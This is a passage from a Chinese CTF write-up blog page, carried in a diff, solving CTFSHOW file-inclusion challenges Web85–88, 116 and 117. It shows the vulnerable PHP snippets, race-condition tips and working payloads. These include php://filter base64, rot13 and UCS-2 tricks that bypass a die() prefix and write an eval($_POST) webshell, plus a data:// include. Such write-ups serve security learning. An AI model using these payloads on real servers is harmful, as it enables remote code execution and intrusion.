class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>你删库任你删库，时间差就是为所欲为</p>
+<p>一样跑,但是线程要拉到10</p>
+<h3 id="Web85（条件竞争）"><a href="#Web85（条件竞争）" class="headerlink" title="Web85（条件竞争）"></a>Web85（条件竞争）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$content</span>, <span class="string">&quot;&lt;&quot;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+<p>你告诉我你判断要不要时间，要不要时间？时间差！跑！</p>
+<p>龙哥主打的就是时间差</p>
+<p>线程数依旧是10稳定发挥</p>
+<h3 id="Web86（条件竞争）"><a href="#Web86（条件竞争）" class="headerlink" title="Web86（条件竞争）"></a>Web86（条件竞争）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;还要秀？&#x27;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(还要秀？);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样是多线程爆破</p>
+<ul>
+<li><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;123/test1.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;123/test2.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+</li>
+<li><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">set_include_path</span>(<span class="string">&#x27;123/&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;test1.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;test2.php&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>你虽然设置了include的路径，但是我多个线程的时候，总有一个会因为时间差溜进去</p>
+<h3 id="Web87（file-put-contents和死亡代码）"><a href="#Web87（file-put-contents和死亡代码）" class="headerlink" title="Web87（file_put_contents和死亡代码）"></a>Web87（file_put_contents和死亡代码）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">  <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">  <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">  <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">  <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">  <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">  <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里就出现了死亡代码<code>&lt;?php die();?&gt;</code>一旦执行，程序结束，所以我们有什么办法可以避免执行呢？</p>
+<h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><ul>
+<li>介绍一下base64解码的特点</li>
+</ul>
+<p>首先base64解码时只会识别字母和一些特殊字符如&#x3D;，其他的不识别，其次base64解码是将4个字节转化为3个字节，如：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662393036667-a28d4d75-3b5e-4913-b681-c6182e1ad0ee.png#averageHue=%23fcfbfa&id=qwwU9&originHeight=379&originWidth=316&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>利用这一特性我们可以将题目做出来</p>
+<ul>
+<li>其次</li>
+</ul>
+<p>简单来讲，<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Base64&spm=1001.2101.3001.7020">Base64</a>就是用下列总计64个字符：</p>
+<blockquote>
+<ul>
+<li>A-Z </li>
+<li>a-z </li>
+<li>0-9 </li>
+<li><ul>
+<li></li>
+</ul>
+</li>
+<li>&#x2F;</li>
+</ul>
+</blockquote>
+<ul>
+<li>浏览器解码特点</li>
+</ul>
+<p>其实当我们在浏览器传参时，浏览器是会先帮我们进行一次url解码的</p>
+<ul>
+<li>利用filter伪协议</li>
+</ul>
+<p>？file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;s1mple.php</p>
+<p>假如我们的file就是这个伪协议的话，注意这里是<code>decode</code>，我们会把文件里面的内容进行base64解码，因为死亡代码中只有<code>phpdie</code>会被识别出来，只有六个字节，这时候我们再content最前面添加2个字节就可以<code>销毁死亡代码</code></p>
+<ul>
+<li>payload</li>
+</ul>
+<p>由于浏览器会帮我们进行一次解码，所以这里我们要进行两次URL加密</p>
+<p>这里的url编码是要所有字符都进行编码，这里推荐一个网址：<a target="_blank" rel="noopener" href="http://web.chacuo.net/charseturlencode%EF%BC%88%E9%80%89%E6%8B%A9%E9%87%8C%E9%9D%A2%E7%9A%84%E5%A4%8D%E6%9D%82%E6%A8%A1%E5%BC%8F%EF%BC%89">http://web.chacuo.net/charseturlencode（选择里面的复杂模式）</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file=%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span></span><br><span class="line"><span class="comment">#这里就是相当于php://filter/convert.base64-decode/resource=cmd.php</span></span><br><span class="line"><span class="comment">#同时传入content</span></span><br><span class="line">content=aaaaaaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+</span><br><span class="line"><span class="comment">#PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+等价于&lt;?php eval($_POST[1]);?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>PS：这边不能单单的添加两个a，这时候会出现乱码，由于phpdie是6个字节，当我们添加2个字节aa时：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662393557573-055e4f70-229a-4206-a688-54a1698039b5.png#averageHue=%23fbfaf9&id=z8NSh&originHeight=392&originWidth=634&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>可以看到我们的尖括号没了，这时候代码不会被运行，这是一个bug吧，类似，当我们再凑四个字节也就是phpdieaaaaa时：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662393599251-47d9d184-0cea-4d06-876b-bc1f24ac2d9e.png#averageHue=%23fbfafa&id=rGl2L&originHeight=390&originWidth=800&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">我们的尖括号就回来了然后<code>死亡代码销毁</code>，程序得以RCE运行，密码是1，最后只需要一步步的去读取flag就可以了</p>
+<h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>使用rot13过滤器：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662422714599-c7dc25a2-56f8-4648-8b7e-b652ff8225cb.png#averageHue=%23fefefe&id=fyXKP&originHeight=648&originWidth=972&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p>payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;1.php</p>
+<p>content&#x3D;<?cuc riny($_cbfg[1]);?></p>
+<p>传入后1.php的内容如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?cuc qvr(&#x27;大佬别秀了);&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>前面的不会被识别，而我们的eval被识别，RCE就绪</p>
+<h3 id="Web88（BASE64规则）"><a href="#Web88（BASE64规则）" class="headerlink" title="Web88（BASE64规则）"></a>Web88（BASE64规则）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>简简单单的几行代码，就一个pregmatch和一个include，用屁股想都知道是用伪协议，首先php被ban了，filter的就别想了</p>
+<p>只可能是data的伪协议，我们采用base64编码，但是这里注意，base64编码出来的结果结尾不能是+或者&#x3D;号，因为被过滤了</p>
+<p>至于解决方法，由于base64编码是三个字节转成四个字节，&#x3D;只是个补充符号罢了，去掉不会影响我们的指令运行，所以只要结尾不是+号的就可以</p>
+<ul>
+<li>构造payload：</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663473809395-23ee99ac-babb-41c6-9683-4b79e82a0f89.png#averageHue=%23282828&clientId=ue9296457-f861-4&from=paste&height=123&id=ue3a77c8c&name=image.png&originHeight=154&originWidth=1204&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24188&status=done&style=none&taskId=u5f6c45cc-7619-409d-a4f8-ea23899369e&title=&width=963.2" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663473813815-261edc12-6f4a-4b11-81a3-6fc39783f5c2.png#averageHue=%232c2c2c&clientId=ue9296457-f861-4&from=paste&height=118&id=u70ba2f30&name=image.png&originHeight=147&originWidth=790&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15498&status=done&style=none&taskId=ue8b70648-bbc9-4f39-afa9-d5e0e61a06f&title=&width=632" alt="image.png"></p>
+<p>编码后是&#x3D;号结尾，所以直接去掉等号传参<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663473821302-23be2d44-5021-4c6c-acc7-caed10be8eba.png#averageHue=%23d0cfcf&clientId=ue9296457-f861-4&from=paste&height=467&id=ud4d6cc6b&name=image.png&originHeight=584&originWidth=1198&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67027&status=done&style=none&taskId=u500a881c-675f-41ec-8149-7567d90ceb1&title=&width=958.4" alt="image.png"></p>
+<p>answer就出来了</p>
+<p>接下来：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663473831217-5bb0f327-8446-4b3c-ac56-9443d648dba3.png#averageHue=%235b5b5b&clientId=ue9296457-f861-4&from=paste&height=322&id=ua5216721&name=image.png&originHeight=403&originWidth=1105&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45050&status=done&style=none&taskId=uee9b8cbc-c317-4554-8ad4-982535343a8&title=&width=884" alt="image.png"></p>
+<p>老样子去除等号：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663473837968-0d9f3d08-b783-4cc7-9620-ade61011b839.png#averageHue=%23b7b7b7&clientId=ue9296457-f861-4&from=paste&height=390&id=ue4865e04&name=image.png&originHeight=488&originWidth=1195&originalType=binary&ratio=1&rotation=0&showTitle=false&size=95759&status=done&style=none&taskId=u9e8398c1-b06e-4557-9fd8-93394d82aab&title=&width=956" alt="image.png"></p>
+<p>答案就出来了，RESPECT,RESPECT</p>
+<h3 id="Web116（MISC-LFI）"><a href="#Web116（MISC-LFI）" class="headerlink" title="Web116（MISC+LFI）"></a>Web116（MISC+LFI）</h3><p>进入页面给了一段视频给我们，先下载</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663473928906-fbb79a93-f287-4bef-ae61-a10fe4dfb103.png#averageHue=%23050805&clientId=ue9296457-f861-4&from=paste&height=386&id=u69129514&name=image.png&originHeight=483&originWidth=974&originalType=binary&ratio=1&rotation=0&showTitle=false&size=241053&status=done&style=none&taskId=ufd35cd4a-1929-4e92-b74d-64d425ee8bc&title=&width=779.2" alt="image.png"></p>
+<p>题目提示是misc+LFI，我们把视频拖到010editor观察一下：<br>我们直接查看文件尾部，发现了一个PNG的文件尾：<code>AE 42 60 82</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663473952972-c2334e27-db85-49c0-816b-26c5f9d654de.png#averageHue=%233a3833&clientId=ue9296457-f861-4&from=paste&height=195&id=uf735e6b8&name=image.png&originHeight=244&originWidth=850&originalType=binary&ratio=1&rotation=0&showTitle=false&size=115927&status=done&style=none&taskId=ue9404a95-7571-4cfb-b43f-34264cda99f&title=&width=680" alt="image.png"></p>
+<p>所以盲猜这里有一个png图片，搜索png的文件头:<code>89 50 4E 47</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663473944793-6da22c97-e605-4ea9-88bb-97248d4ed77d.png#averageHue=%233f3c36&clientId=ue9296457-f861-4&from=paste&height=471&id=u091e469e&name=image.png&originHeight=589&originWidth=580&originalType=binary&ratio=1&rotation=0&showTitle=false&size=283887&status=done&style=none&taskId=u461aac6c-facb-413b-b0a6-762cd025241&title=&width=464" alt="image.png"></p>
+<p>果真有，我们新建一个16进制的文件（图片），然后把数据复制进去，保存png格式，打开发现源代码：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663473969488-d889025e-69cc-46c5-8f24-b6ad67507c4a.png#averageHue=%2351504b&clientId=ue9296457-f861-4&from=paste&height=734&id=u97ec792a&name=image.png&originHeight=917&originWidth=1188&originalType=binary&ratio=1&rotation=0&showTitle=false&size=126507&status=done&style=none&taskId=uefe947cf-edfe-426a-bc6f-a03fc208938&title=&width=950.4" alt="image.png"></p>
+<p>提示我们传入file,这里就显得十分降智了<br>直接payload:?file&#x3D;flag.php就猜出来了<br>输入payload后看不到flag，禁止了我们访问源代码，我们就view-source:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663473986312-f6643ba5-1c89-4e50-b902-1584af589d39.png#averageHue=%23fcfcfc&clientId=ue9296457-f861-4&from=paste&height=261&id=u82667680&name=image.png&originHeight=326&originWidth=1209&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47188&status=done&style=none&taskId=u9ffef88d-c21d-41ba-a434-e6a3204c8ee&title=&width=967.2" alt="image.png"></p>
+<h3 id="Web117"><a href="#Web117" class="headerlink" title="Web117"></a>Web117</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure>
+
+<p>与上一题的源码差不多，ban的东西也一样，就是不ban filter，这不是在给我指路吗<br>和文章<strong>file_pun_contents和死亡代码</strong>讲的内容是一样的<br>ban掉了base64编码，rot13编码，UTF编码，string<br>剩下的还有convert.iconv.中的usc-2和usc-4</p>
+<p>payload如下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663474016495-01aee915-95da-4ad1-8da0-ffb8f258ce88.png#averageHue=%23222222&clientId=ue9296457-f861-4&from=paste&height=250&id=u3e29c98b&name=image.png&originHeight=312&originWidth=1214&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54576&status=done&style=none&taskId=udf0288f5-cf06-489a-8c34-2ebe15640f9&title=&width=971.2" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663474022270-3e5e6076-04e5-4a9a-9911-27678cbdee71.png#averageHue=%232e2e2e&clientId=ue9296457-f861-4&from=paste&height=366&id=u069dc55c&name=image.png&originHeight=457&originWidth=1102&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72387&status=done&style=none&taskId=ub4d4cc04-5b03-461f-a25f-498516d2268&title=&width=881.6" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（get）?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=1.php</span><br><span class="line"></span><br><span class="line">（post）contents=?&lt;hp+pe@av(l_$OPTSs[m1lp]e;)&gt;?</span><br></pre></td></tr></table></figure>
+
+<h1 id="————————-结———————"><a href="#————————-结———————" class="headerlink" title="————————-结———————-"></a>————————-结———————-</h1>
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/刷题记录/" class="tag">#刷题记录</a><a href="/tags/CTFSHOW/" class="tag">#CTFSHOW</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/03/02/CTFSHOW-Node.Js/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">CTFSHOW-NodeJS</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/03/02/CTFSHOW-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">CTFSHOW-Java反序列化</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
